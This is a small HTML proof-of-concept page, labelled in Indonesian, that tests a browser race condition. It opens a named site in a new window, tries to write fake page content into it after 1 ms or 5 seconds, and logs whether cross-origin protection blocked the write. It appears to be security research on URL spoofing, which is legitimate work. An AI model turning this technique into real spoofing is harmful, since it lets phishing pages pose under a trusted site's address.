<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>PoC - Window Opener Race Condition Test</title>
</head>
<body>
  <h2>Test: Pending URL / Navigation Race</h2>
  <p>Buka Console (F12) sebelum klik, lalu tunggu hasilnya.</p>

  <button onclick="spoofFast()">Test Delay 1ms (cepat)</button>
  <button onclick="spoofSlow()">Test Delay 5000ms (lambat)</button>

  <script>
    function spoofFast() {
      var win = window.open('https://faizdevs.my.id');
      setTimeout(function() {
        try {
          win.document.write('<h1>Halaman palsu tampil (delay 1ms)</h1>');
          win.document.close();
          console.log('[1ms] BERHASIL nulis — berarti belum commit ke faizdevs.my.id');
        } catch(e) {
          console.log('[1ms] DIBLOKIR:', e.message, '— sudah commit, cross-origin protection aktif');
        }
      }, 1);
    }

    function spoofSlow() {
      var win = window.open('https://faizdevs.my.id');
      setTimeout(function() {
        try {
          win.document.write('<h1>Halaman palsu tampil (delay 5000ms)</h1>');
          win.document.close();
          console.log('[5000ms] BERHASIL nulis — berarti masih belum commit ke faizdevs.my.id');
        } catch(e) {
          console.log('[5000ms] DIBLOKIR:', e.message, '— sudah commit, cross-origin protection aktif');
        }
      }, 5000);
    }
  </script>
</body>
</html>
